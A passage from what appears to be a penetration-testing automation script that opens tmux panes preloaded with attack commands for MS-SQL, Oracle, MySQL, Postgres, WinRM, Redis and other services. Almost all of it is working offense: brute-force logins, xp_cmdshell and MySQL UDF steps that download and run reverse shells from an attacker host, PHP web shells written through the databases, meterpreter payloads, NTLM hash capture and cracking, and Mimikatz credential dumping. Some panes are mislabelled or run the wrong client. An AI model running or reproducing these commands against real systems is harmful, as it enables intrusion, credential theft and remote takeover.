('G', 'R') order by sp.name;\n\" " Enter
tmux send-keys -t PT:26.8 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip -windows-auth"
cd $folderProject

cd $folderProjectAuthN
# GDB Server
tmux new-window -t PT:27 -n '[1443] MS-SQL: user sysadmin, read/write file, reverse shell, user HASH'
tmux split-window -v -t PT:27.0
tmux resize-pane -t PT:27.0 -y 3
tmux select-pane -t "27.0"
tmux split-window -h -t "27.0"
tmux split-window -v -t PT:27.2
tmux select-pane -t "27.2"
tmux split-window -h -t "27.2"
tmux split-window -h -t "27.2"
tmux split-window -v -t PT:27.5
tmux select-pane -t "27.5"
tmux split-window -h -t "27.5"
tmux split-window -v -t PT:27.7
tmux select-pane -t "27.7"
tmux split-window -h -t "27.7"
tmux split-window -h -t "27.7"
tmux split-window -v -t PT:27.10
tmux select-pane -t "27.10"
tmux split-window -h -t "27.10"
tmux split-window -h -t "27.10"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:27.0 "printf \"\n# Create sysadmin with sp_addsrvrolemember:\n\n# SQL> CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'\n# SQL> EXEC sp_addsrvrolemember 'hacker', 'sysadmin'\n\" " Enter
tmux send-keys -t PT:27.0 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:27.1 "printf \"\n# Create sysadmin with trustworthy database:\n\n# Find databases ownership\n# SQL> SELECT name,suser_sname(owner_sid) FROM sys.databases\n# Find trustworthy database\n# SQL> SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;\n# Find roles over the selected trustworthy database\n# SQL> USE <trustworthy_db>\n# SQL> SELECT rp.name as database_role, mp.name as database_user from sys.database_role_members drm join sys.database_principals rp on (drm.role_principal_id = rp.principal_id) join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)\n# If you find you are db_owner of a trustworthy database you can privesc\n# SQL> USE <trustworthy_db>\n# SQL> CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember  'USERNAME','sysadmin'\n# Execute stored proceure to add your user to sysadmin role\n# SQL> USE <trustworthy_db>\n# SQL> EXEC sp_elevate_me\n# Verify your user is a sysadmin\n# SQL> SELECT is_srvrolemember('sysadmin')\n\n\" " Enter
tmux send-keys -t PT:27.1 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:27.2 "printf \"\n# Read a File with xp_cmdshell:\n\n# Activate xp_cmdshell\n# SQL> EXEC sp_configure 'show advanced options', 1;\n# SQL> RECONFIGURE;\n# SQL> EXEC sp_configure 'xp_cmdshell', 1;\n# SQL> RECONFIGURE;\n# Read File with:\n# SQL> EXEC xp_cmdshell 'dir C:\\my\\directory';\n# SQL> EXEC xp_cmdshell 'type C:\\my\\directory\\myFile.txt';\n\n\" " Enter
tmux send-keys -t PT:27.2 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:27.3 "printf \"\n# Read a File with xp_dirtree:\n\n# SQL> xp_dirtree c:\inetpub\wwwroot\n\n\" " Enter
tmux send-keys -t PT:27.3 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:27.4 "printf \"\n#  Read a File with OPENROWSET:\n\n# SQL> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n\n\" " Enter
tmux send-keys -t PT:27.4 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:27.5 "printf \"\n# Write File with xp_cmdhsell:\n\n# SQL> DECLARE @cmd SYSNAME;\n# SQL> SET @cmd = 'echo Hello World > C:\my\directory\myFile.txt';\n# SQL> EXEC master..xp_cmdshell @cmd;\n\n\" " Enter
tmux send-keys -t PT:27.5 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:27.6 "printf \"\n# Write File with OAMethod:\n\n# SQL> sp_configure 'show advanced options', 1\n# SQL> RECONFIGURE\n# SQL> sp_configure 'Ole Automation Procedures', 1\n# SQL> RECONFIGURE\n# Create a File:\n# SQL> DECLARE @OLE INT\n# SQL> DECLARE @FileID INT\n# SQL> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\n# SQL> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1\n# SQL> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET[\"c\"]);?>'\n# SQL> EXECUTE sp_OADestroy @FileID\n# SQL> EXECUTE sp_OADestroy @OLE\n\n\" " Enter
tmux send-keys -t PT:27.6 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:27.7 "MS-SQL from xp_cmdshell to ReverseShell: prepare reverseShell" Enter
tmux send-keys -t PT:27.7 "sudo cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /var/www/html/shell.ps1 && cd /var/www/html && python3 -m http.server"
tmux send-keys -t PT:27.8 "MS-SQL from xp_cmdshell to ReverseShell: prepare listener" Enter
tmux send-keys -t PT:27.8 "rlwrap nc -nlvp 9001"
tmux send-keys -t PT:27.9 "printf \"\n# MS-SQL from xp_cmdshell to ReverseShell: activate reverseShell\n# Verify if I can execute xp_cmdshell\n# SQL> xp_cmdshell 'whoami'\n# If xp_cmdshell does not work I can try to activate it with:\n# SQL> EXEC sp_configure 'show advanced options', 1\n# SQL> RECONFIGURE\n# SQL> xp_cmdshell 'whoami'\n# Get reverseShell with:\n# SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP:8000/shell.ps1\") | powershell -noprofile'\n# or Get revereShell with:\n# SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP:8000/shell.ps1\")\n# Note:\n# If xp_cmdshell is blacklisted try with\n# DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping zdmagrxjtobmobfzjbqsoevmoes65rtp5.oast.fun' --\n\n\" " Enter
tmux send-keys -t PT:27.9 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:27.10 "MS-SQL get mssql account HASH: activate SMB listener" Enter
tmux send-keys -t PT:27.10 "sudo impacket-smbserver share ./ -smb2support"
tmux send-keys -t PT:27.11 "printf \"\n# MS-SQL get mssql account HASH: activate SMB call from mssql server\n# SQL> xp_dirtree '\\<attacker_IP>\any\thing'\n# SQL> exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'\n# SQL> exec master..xp_subdirs '\\<attacker_IP>\anything\'\n# SQL> exec master..xp_fileexist '\\<attacker_IP>\anything\'\n\n\" " Enter
tmux send-keys -t PT:27.11 "python /usr/share/doc/python3-impacket/examples/mssqlclient.py 'USER:PASS'@$ip"
tmux send-keys -t PT:27.12 "MS-SQL get mssql account HASH: crack mssal account HASH" Enter
tmux send-keys -t PT:27.12 "hashcat -m 5600 sql.hash.ntlmv2 /usr/share/wordlist/rockyou.txt"
cd $folderProject


cd $folderProjectAuthN
# ORACLE
tmux new-window -t PT:28 -n '[1521] Oracle'
tmux split-window -v -t PT:28.0
tmux resize-pane -t PT:28.0 -y 3
tmux select-pane -t "28.0"
tmux split-window -h -t "28.0"
tmux split-window -h -t "28.0"
tmux split-window -h -t "28.0"
tmux split-window -h -t "28.0"
tmux split-window -h -t "28.0"
tmux split-window -v -t PT:28.6
tmux resize-pane -t PT:28.6 -y 3
tmux select-pane -t "28.6"
tmux split-window -h -t "28.6"
tmux split-window -h -t "28.6"
tmux split-window -v -t PT:28.9
tmux select-pane -t "28.9"
tmux split-window -h -t "28.9"
tmux split-window -h -t "28.9"
tmux split-window -h -t "28.9"
tmux split-window -v -t PT:28.13
tmux select-pane -t "28.13"
tmux split-window -h -t "28.13"
tmux split-window -h -t "28.13"
tmux split-window -h -t "28.13"
tmux split-window -v -t PT:28.17
tmux select-pane -t "28.17"
tmux split-window -h -t "28.17"
tmux split-window -h -t "28.17"
tmux split-window -h -t "28.17"
tmux split-window -v -t PT:28.21
tmux select-pane -t "28.21"
tmux split-window -h -t "28.21"
tmux split-window -h -t "28.21"
tmux split-window -h -t "28.21"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:28.0 "# Oracle: odat ping" Enter
tmux send-keys -t PT:28.0 "sudo odat tnscmd -s $ip -p 1521 --ping"
tmux send-keys -t PT:28.1 "# Oracle: find SIDs with Standard dictionary" Enter
tmux send-keys -t PT:28.1 "sudo odat sidguesser -s $ip -p 1521"
tmux send-keys -t PT:28.2 "# Oracle: find SIDs with Custom dictionary" Enter
tmux send-keys -t PT:28.2 "sudo odat sidguesser -s $ip -p 1521 --sids-file ./custom_sids.txt"
tmux send-keys -t PT:28.3 "# Oracle: find credentials with Standard dictionary" Enter
tmux send-keys -t PT:28.3 "sudo odat passwordguesser -s $IP -p 1521 -d SID"
tmux send-keys -t PT:28.4 "# Oracle: find credentials with Custom dictionary" Enter
tmux send-keys -t PT:28.4 "sudo odat passwordguesser -s $IP -p 1521 -d SID --accounts-file accounts_multiple.txt"
tmux send-keys -t PT:28.5 "# Oracle: find credentials with Custom dictionary" Enter
tmux send-keys -t PT:28.5 "sudo patator oracle_login sid=<SID> host=$ip user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017"
tmux send-keys -t PT:28.6 "# Oracle: Connect Orcale with standard credetials" Enter
tmux send-keys -t PT:28.6 "sqlplus USER/PASS@$ip:1521"
tmux send-keys -t PT:28.7 "# Oracle: Connect Oracle with sysdba" Enter
tmux send-keys -t PT:28.7 "sqlplus USER/PASS@$ip:1521 as sysdba"
tmux send-keys -t PT:28.8 "printf \"\n# Oracle: Extract data\n# Select CDB and PDB\n# SQL> SELECT SYS_CONTEXT('USERENV', 'CON_NAME') AS CURRENT_PDB,(SELECT NAME FROM V$DATABASE) AS CDB_NAME FROM DUAL;\n# Select all databases related to CDB\n# SQL> SELECT CON_ID, NAME AS CONTAINER_NAME, OPEN_MODE FROM V$CONTAINERS ORDER BY CON_ID;\n# Select all tables \n# Select all the tables I have access to in the current PDB (es. HR_PDB)\n# SQL> ALTER SESSION SET CONTAINER = HR_PDB;\n# SQL> SELECT TABLE_NAME, OWNER FROM ALL_TABLES;\n# # If my account is sysdba I can use this query\n# SQL> SELECT TABLE_NAME, OWNER FROM DBA_TABLES;\n# Select all data about JOBS table of HR_PDB database\n# SQL> SELECT * FROM JOBS;\n\n\" " Enter
tmux send-keys -t PT:28.8 "sqlplus USER/PASS@$ip:1521 as sysdba"
tmux send-keys -t PT:28.9 "# Oracle: Info Exposure - Extract Oracle users password HASH" Enter
tmux send-keys -t PT:28.9 "odat passwordstealer -s $ip -d mySID -U myUser -P myPsssword --get-passwords"
tmux send-keys -t PT:28.10 "# Oracle: Info Exposure -  Download a file" Enter
tmux send-keys -t PT:28.10 "odat ctxsys -s $ip -d mySID -U myUser -P myPassword --getFile /etc/passwd"
tmux send-keys -t PT:28.11 "# Oracle: Info Exposure -  Find columns in database which contain Password word" Enter
tmux send-keys -t PT:28.11 "odat search -s $ip -d mySID -U myUser -P myPassword --pwd-column-names --show-empty-columns"
tmux send-keys -t PT:28.12 "# Oracle: Info Exposure -  Execute command" Enter
tmux send-keys -t PT:28.12 "odat oradbg -s $ip -d mySID -U myUser -P myPassword --exec /bin/ls"
tmux send-keys -t PT:28.13 "# Oracle: Reverse Shell (odat) - verify scheduler is active" Enter
tmux send-keys -t PT:28.13 "odat dbmsscheduler -s $ip -d mySID -U myUser -P myPassword --test-module"
tmux send-keys -t PT:28.14 "# Oracle: Reverse Shell (odat) - activate Listener" Enter
tmux send-keys -t PT:28.14 "nc -nlvp 9001"
tmux send-keys -t PT:28.15 "# Oracle: Reverse Shell (odat) - activate reverse shell" Enter
tmux send-keys -t PT:28.15 "odat dbmsscheduler -s $ip -d mySID -U myUser -P myPassword --reverse-shell <ATTACKER_IP> 9001"
tmux send-keys -t PT:28.16 "# Oracle: Reverse Shell (odat) - activate shell on remote server on port 4460" Enter
tmux send-keys -t PT:28.16 "odat dbmsscheduler -s $ip -d mySID -U myUser -P myPassword --exec \"/sbin/nc.traditional -vpl 4460 -e /bin/bash\""
tmux send-keys -t PT:28.17 "# Oracle: Reverse Shell (utlfile) - create reverse meterpreter shell" Enter
tmux send-keys -t PT:28.17 "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe -o out.exe"
tmux send-keys -t PT:28.18 "# Oracle: Reverse Shell (utlfile) - activate meterpreter listener" Enter
tmux send-keys -t PT:28.18 "sudo msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp;set LHOST <ATTACKER_IP>;set LPORT 443;run\""
tmux send-keys -t PT:28.19 "# Oracle: Reverse Shell (utlfile) - upload file on remote server" Enter
tmux send-keys -t PT:28.19 "odat utlfile -s $ip –sysdba -d SID -U USER -P PASS –putFile /temp revShell.exe out.exe"
tmux send-keys -t PT:28.20 "# Oracle: Reverse Shell (utlfile) - execute file on remote server" Enter
tmux send-keys -t PT:28.20 "odat externaltable -s $ip --sysdba -d XE -U scott -P tiger --exec /temp revShell.exe"
tmux send-keys -t PT:28.21 "# Oracle: Read / Write file - connect to Oracle" Enter
tmux send-keys -t PT:28.21 "sqlplus64 USER/PASS@$ip:1521/SID as sysdba"
tmux send-keys -t PT:28.22 "printf \"\n# Oracle: Read / Write file - set option to show output\n# SQL> set serveroutput ON\n# /\n\n\" " Enter
tmux send-keys -t PT:28.22 "sqlplus USER/PASS@$ip:1521 as sysdba"
tmux send-keys -t PT:28.23 "printf \"\n# Oracle: Read / Write file - Read /etc/passwd\n# DECLARE file UTL_FILE.FILE_TYPE; line VARCHAR2(32767); BEGIN file := UTL_FILE.FOPEN('/etc/passwd','R'); LOOP UTL_FILE.GET_LINE(file,line); DBMS_OUTPUT.PUT_LINE(line); END LOOP; UTL_FILE.FCLOSE(file); EXCEPTION WHEN NO_DATA_FOUND THEN UTL_FILE.FCLOSE(file); END; /\n\n\" " Enter
tmux send-keys -t PT:28.23 "sqlplus USER/PASS@$ip:1521 as sysdba"
tmux send-keys -t PT:28.24 "printf \"\n# Oracle: Read / Write file - Write /var/www/html/shell.php\n# DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('/var/www/html','shell.php','W'); UTL_FILE.PUT_LINE(f,'<?php'); UTL_FILE.PUT_LINE(f,'if(isset(\\\$_GET[\"cmd\"])){'); UTL_FILE.PUT_LINE(f,'\\\$output=shell_exec(\\\$_GET[\"cmd\"]);'); UTL_FILE.PUT_LINE(f,'echo\\\"<pre>\\\$output</pre>\\\";}?>'); UTL_FILE.FCLOSE(f); END; /\n\n\" " Enter
tmux send-keys -t PT:28.24 "sqlplus USER/PASS@$ip:1521 as sysdba"
cd $folderProject

cd $folderProjectAuthN
# SMB Credential Verification
tmux new-window -t PT:29 -n '[3128] Squid (reverse proxy)'
tmux split-window -v -t PT:29.0
tmux split-window -v -t PT:29.1
tmux select-pane -t "29.1"
tmux split-window -h -t "29.1"
tmux split-window -v -t PT:29.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:29.0 "# Squid: configure proxychains to Squid proxy" Enter
tmux send-keys -t PT:29.0 "sudo sed -i '/127\.0\.0\.1/s/^/#/' /etc/proxychains4.conf && sudo grep -q "http $IP $PORTA $USER $PASS" /etc/proxychains4.conf || echo "http $IP $PORTA $USER $PASS" | sudo tee -a /etc/proxychains4.conf > /dev/null"
tmux send-keys -t PT:29.1 "# Squid: nmap analysis via proxychains" Enter
tmux send-keys -t PT:29.1 "proxychains nmap -sT -sV 127.0.0.1 -p- -Pn"
tmux send-keys -t PT:29.2 "# Squid: ssh connection via proxychains" Enter
tmux send-keys -t PT:29.2 "proxychains ssh USER@127.0.0.1"
tmux send-keys -t PT:29.3 "# Squid: sqlmap configured with proxy but without proxychains" Enter
tmux send-keys -t PT:29.3 "sudo sqlmap -u \"http://$site/item.php?size=1\" --current-db --proxy=\"http://$ip:3128\" --proxy-cred=\"USER:PASS\""
cd $folderProject

cd $folderProjectAuthN
# Mysql MariaDB
tmux new-window -t PT:30 -n '[3306] Mysql/MariaDB'
tmux split-window -v -t PT:30.0
tmux resize-pane -t PT:30.0 -y 3
tmux split-window -v -t PT:30.1
tmux resize-pane -t PT:30.1 -y 3
tmux split-window -v -t PT:30.2
tmux select-pane -t "30.2"
tmux split-window -h -t "30.2"
tmux split-window -h -t "30.2"
tmux split-window -h -t "30.2"
tmux split-window -h -t "30.2"
tmux split-window -v -t PT:30.7
tmux select-pane -t "30.7"
tmux split-window -h -t "30.7"
tmux split-window -v -t PT:30.9
tmux select-pane -t "30.9"
tmux split-window -h -t "30.9"
tmux split-window -h -t "30.9"
tmux split-window -h -t "30.9"
tmux split-window -h -t "30.9"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:30.0 "# Mysql/MariaDB: service fingerprint" Enter
tmux send-keys -t PT:30.0 "nmap -sV -Pn -vv --script=mysql-* $ip -p 3306 -o out.3306"
tmux send-keys -t PT:30.1 "# Mysql/MariaDB: verify Credentials" Enter
tmux send-keys -t PT:30.1 "hydra -L users.txt -P passwords.txt -f mysql://$ip:3306 && hydra -L users.txt -P users.txt -f mysql://$ip:3306 && hydra -l '' -p '' -f mysql://$ip:3306 && hydra -l 'dontknow' -p '' -f mysql://$ip:3306"
tmux send-keys -t PT:30.2 "# Mysql/MariaDB: Access DB" Enter
tmux send-keys -t PT:30.2 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
tmux send-keys -t PT:30.3 "printf \"\n# Mysql/MariaDB: Useful information from DB\n# View parameters describing the current state of the server\n mysql> show status;\n# View the user I am connected to the database with\n mysql> select user();\n# I see what rights my user has\n mysql> SHOW GRANTS FOR 'nomeutente'@'localhost';\n\n\" " Enter
tmux send-keys -t PT:30.3 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
tmux send-keys -t PT:30.4 "printf \"\n# Mysql/MariaDB: Read File \n mysql> CREATE TABLE temp_file (line TEXT);\n mysql> LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_file FIELDS TERMINATED BY;\n\n\" " Enter
tmux send-keys -t PT:30.4 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
tmux send-keys -t PT:30.5 "printf \"\n# Mysql/MariaDB: Write File\n mysql> SELECT \"<?php system(\\\$_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/shell.php';\n\n\" " Enter
tmux send-keys -t PT:30.5 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
tmux send-keys -t PT:30.6 "printf \"\n# Mysql/MariaDB: Get info from DB\n# Get all databases\n mysql> show databases;\n# Get all tables of a specific DB\n# mysql> use <DATABASE>\n# mysql> show tables;\n# Get table structure\n mysql> describe <nome tabella>;\n# Get tables data\n mysql> select * from tables;\n# Exit from DB\n mysql> exit\n# Dump whole database\n# mysqldump -h $ip -P 3306 -u USER -p --single-transaction --routines --triggers --databases <DB_NAME> > backup.sql\n\n\" " Enter
tmux send-keys -t PT:30.6 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
tmux send-keys -t PT:30.7 "# Mysql/MariaDB: get DB user HASH" Enter
tmux send-keys -t PT:30.7 "sudo impacket-smbserver share ./ -smb2support"
tmux send-keys -t PT:30.8 "printf \"\n# Activate a SMB Request from remote database\n# mysql> LOAD DATA INFILE '\ \<ATTACKER_IP>\myfile.txt' INTO TABLE my_table;\n\n\" " Enter
tmux send-keys -t PT:30.9 "# Mysql Reverse Shell: Get Hex value of the plugin that execute data on Mysql" Enter
tmux send-keys -t PT:30.9 "sudo sh -c 'xxd -p lib_mysqludf_sys.so | tr -d \"\n\" > lib_mysqludf_sys.so.hex'"
tmux send-keys -t PT:30.10 "printf \"\n# Mysql Reverse Shell: Upload plugin on mysql\n# Get mysql folder which contains plugin\n mysql> select @@plugin_dir\n# Set shell variable to contain hex compiled\n mysql> set @shell = 0x7f454c46020...00000000000000000000;\n# Create plugin file\n mysql> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';\n# Create function which contain my plugin\n mysql> create function sys_exec returns int soname 'udf_sys_exec.so';\n\n\" " Enter
tmux send-keys -t PT:30.10 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
tmux send-keys -t PT:30.11 "# Mysql Reverse Shell: Prepare Reverse Shell and make it availble via HTTP" Enter
tmux send-keys -t PT:30.11 "sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=9001 -f elf -o shell.elf && sudo cp shell.elf /var/www/html && cd /var/www/html && python3 –m http.server 80"
tmux send-keys -t PT:30.12 "# Mysql Reverse Shell: Activate listener meterpreter" Enter
tmux send-keys -t PT:30.12 "sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 9001; exploit -j\""
tmux send-keys -t PT:30.13 "printf \"\n# Mysql Reverse Shell: Activate meterpreter on remote database\n# Upload meterpreter shell on remote database\n mysql> select sys_exec('wget http://<ATTACKER_IP>/shell.elf');\n mysql> select sys_exec('chmod +x ./shell.elf');\n# Activate Reverse Shell\n mysql> select sys_exec('./shell.elf');\n\n\" " Enter
tmux send-keys -t PT:30.13 "mysql -h $ip -P 3306 -u USER -p PASS DB_NAME"
cd $folderProject

cd $folderProjectAuthN
# Postgres
tmux new-window -t PT:31 -n '[5432] Postgres'
tmux split-window -v -t PT:31.0
tmux split-window -v -t PT:31.1
tmux split-window -v -t PT:31.2
tmux select-pane -t "31.2"
tmux split-window -h -t "31.2"
tmux split-window -h -t "31.2"
tmux split-window -h -t "31.2"
tmux split-window -v -t PT:31.6
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:31.0 "# Postgres: bruteforce attack" Enter
tmux send-keys -t PT:31.0 "hydra -L users.txt -P passwords.txt $ip postgres && hydra -L users.txt -P users.txt $ip postgres && hydra -l '' -p '' $ip postgres && hydra -l 'dontknow' -p '' $ip postgres"
tmux send-keys -t PT:31.1 "# Postgres: Access DB" Enter
tmux send-keys -t PT:31.1 "psql -h $ip -p 5432 -U USER"
tmux send-keys -t PT:31.2 "printf \"\n# Postgres: Information Exposure\n# select users and roles\n postgres# SELECT usename, usesysid, usecreatedb, usesuper, userepl FROM pg_user;\n\n\" " Enter
tmux send-keys -t PT:31.2 "psql -h $ip -p 5432 -U USER"
tmux send-keys -t PT:31.3 "printf \"\n# Postgres: Read file\n# Postgres: Read file: Create a temporary table\n postgres# CREATE TEMP TABLE passwd (content text);\n# Postgres: Read file: Copy /etc/file into table\n postgres# \copy dati(content) FROM '/tmp/dati.txt';\n\n\" " Enter
tmux send-keys -t PT:31.3 "sqlplus USER/PASS@$ip:1521 as sysdba"
tmux send-keys -t PT:31.4 "printf \"\n# Postgres: Write file\n# Postgres: Write file: create temporary table\n postgres# CREATE TEMP TABLE tmp_php (content text);\n postgres# INSERT INTO tmp_php (content) VALUES ('<?php system($_GET[\"cmd\"]); ?>');\n# Postgres: Write file: Save the file on filesystem\n postgres# \\\\COPY tmp_php TO '/var/www/html/shell.php';\n\n\" " Enter
tmux send-keys -t PT:31.4 "sqlplus USER/PASS@$ip:1521 as sysdba"
tmux send-keys -t PT:31.5 "printf \"\n# Postgres: Write file with io_export\n postgres# SELECT lo_export(1234, '/tmp/malicious.sh');\n postgres# COPY (SELECT pg_exec('chmod +x /tmp/malicious.sh && /tmp/malicious.sh')) TO '/dev/null';\n\n\" " Enter
tmux send-keys -t PT:31.5 "sqlplus USER/PASS@$ip:1521 as sysdba"
tmux send-keys -t PT:31.6 "printf \"\n# Postgres: Navigate DB\n# Get all databases\n postgres# list\n# Select all tables of a specific database\n postgres# \\\\\\c cozyhosting\n cozyhosting# \\\\\\dt\n# Select all data of a tables \n cozyhosting# select * from users;\n cozyhosting=# select * \"from users\";\n\n\" " Enter
tmux send-keys -t PT:31.6 "sqlplus USER/PASS@$ip:1521 as sysdba"
cd $folderProject

cd $folderProjectAuthN
# WinRM
tmux new-window -t PT:32 -n '[5985,5986] WinRM'
tmux split-window -v -t PT:32.0
tmux split-window -v -t PT:32.1
tmux select-pane -t "32.1"
tmux split-window -h -t "32.1"
tmux split-window -h -t "32.1"
tmux split-window -h -t "32.1"
tmux split-window -v -t PT:32.5
tmux select-pane -t "32.5"
tmux split-window -h -t "32.5"
tmux split-window -h -t "32.5"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:32.0 "# WinRM: brute force" Enter
tmux send-keys -t PT:32.0 "hydra -L users.txt -P passwords.txt $ip winrm && hydra -L users.txt -P users.txt $ip winrm && hydra -l '' -p '' $ip winrm && hydra -l 'dontknow' -p '' $ip winrm"
tmux send-keys -t PT:32.1 "# WinRM: Shell Activation Credential HTTP" Enter
tmux send-keys -t PT:32.1 "evil-winrm -u USER -p PASS -i $ip"
tmux send-keys -t PT:32.2 "# WinRM: Shell Activation CRedential HTTPS" Enter
tmux send-keys -t PT:32.2 "evil-winrm -S -u USER -p PASS -i $ip"
tmux send-keys -t PT:32.3 "# WinRM: Shell Activation HASH-NT HTTP" Enter
tmux send-keys -t PT:32.3 "evil-winrm -u USER -H HASH-NT -i $ip"
tmux send-keys -t PT:32.4 "# WinRM: Shell Activation HASH-NT HTTPS" Enter
tmux send-keys -t PT:32.4 "evil-winrm -S -u USER -H HASH-NT -i $ip"
tmux send-keys -t PT:32.5 "printf \"\n# WinRM: script for dump credentials\n PS> . ./Invoke-Mimikatz.ps1\n PS> Invoke-Mimikatz -Command \\"privilege::debug sekurlsa::logonpasswords\\"\n\n\" " Enter
tmux send-keys -t PT:32.5 "evil-winrm -i $ip -u USER -p PASS -s /opt/evil-winrm/PowerSploit/Exfiltration"
tmux send-keys -t PT:32.6 "printf \"\n#  WinRM: script for activate Reverse Shell\n PS> . ./Invoke-PowerShellTcp.ps1\n PS> Invoke-PowerShellTcp -Reverse -IPAddress <attacker_IP> -Port 9001\n\n\" " Enter
tmux send-keys -t PT:32.6 "evil-winrm -i $ip -u USER -p PASS -s /opt/evil-winrm/nishang/Shells/"
tmux send-keys -t PT:32.7 "printf \"\n# WinRM: script for Active Directory Enumeration\n PS> Get-NetUser\n PS> Get-NetGroup -GroupName "Domain Admins"\n\n\" " Enter
tmux send-keys -t PT:32.7 "evil-winrm -i $ip -u USER -p PASS -s /opt/evil-winrm/PowerSploit/Recon/" 
cd $folderProject

cd $folderProjectAuthN
# REDIS
tmux new-window -t PT:33 -n '[5985,5986] WinRM'
tmux split-window -v -t PT:33.0
tmux resize-pane -t PT:33.0 -y 3
tmux split-window -v -t PT:33.1
tmux select-pane -t "33.1"
tmux split-window -h -t "33.1"
tmux split-window -v -t PT:33.3
tmux split-window -v -t PT:33.4
tmux select-pane -t "33.4"
tmux split-window -h -t "33.4"
tmux split-window -v -t PT:33.6
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:33.0 "# REDIS: brute force" Enter
tmux send-keys -t PT:33.0 "hydra -L users.txt -P passwords.txt $ip winrm && hydra -L users.txt -P users.txt $ip winrm && hydra -l '' -p '' $ip winrm && hydra -l 'dontknow' -p '' $ip winrm"
tmux send-keys -t PT:33.1 "# REDIS: Access DB" Enter
tmux send-keys -t PT:33.1 "redis-cli -h $ip -p 6379 -a USER@PASS"
tmux send-keys -t PT:33.2 "# REDIS: Access DB with TLS" Enter
tmux send-keys -t PT:33.2 "redis-cli -h $ip -p 6379 -a USER@PASS --tls --cacert certificato.pem"
tmux send-keys -t PT:33.3 "printf \"\n# REDIS: Information Exposure\n# Get all keys available\n > KEYS *\n# Get a value related to a specific key\n > GET chiave1\n# Get all values related to a spcific key\n > hgetall chiave1\n# Execute Remote Command\n > system.exec \"whoami\"\n# Print a message\n > echo \"messaggio\"\n# Set a new key-value field\n > set key value\n# Set a new key-value field and delete it after 60 seconds\n > set key value EX 60 \n# Make another server slave\n > slaveof\n# Get all information about REDIS service (e.g. version)\n > info\n\n\" " Enter
tmux send-keys -t PT:33.3 "redis-cli -h $ip -p 6379 -a USER@PASS"
tmux send-keys -t PT:33.4 "# REDIS: Read a file" Enter
tmux send-keys -t PT:33.4 "redis-cli EVAL \"local f = io.open('/etc/passwd', 'r'); local content = f:read('*a'); redis.call('SET', 'passwd_content', content); f:close()\" 0"
tmux send-keys -t PT:33.5 "# REDIS: Write a file" Enter
tmux send-keys -t PT:33.5 "redis-cli EVAL \"local f = io.open('/var/www/html/shell.php', 'w'); f:write('<?php system($_GET[\"cmd\"]); ?>'); f:close()\" 0"
tmux send-keys -t PT:33.6 "# REDIS: Remote Code Execution" Enter
tmux send-keys -t PT:33.6 "sudo python3 redis-rogue-server.py --rhost $ip --rport 6379 --lhost <ATTACKER_IP> --lport 21000"
cd $folderProject

cd $folderProjectAuthN
# JWDP
tmux new-window -t PT:34 -n '[5005, 8000] JWDP'
tmux split-window -v -t PT:34.0
tmux select-pane -t "34.0"
tmux split-window -h -t "34.0"
tmux split-window -h -t "34.0"
tmux split-window -h -t "34.0"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:34.0 "# JWDP: RCE - execute bash from attacker machine" Enter
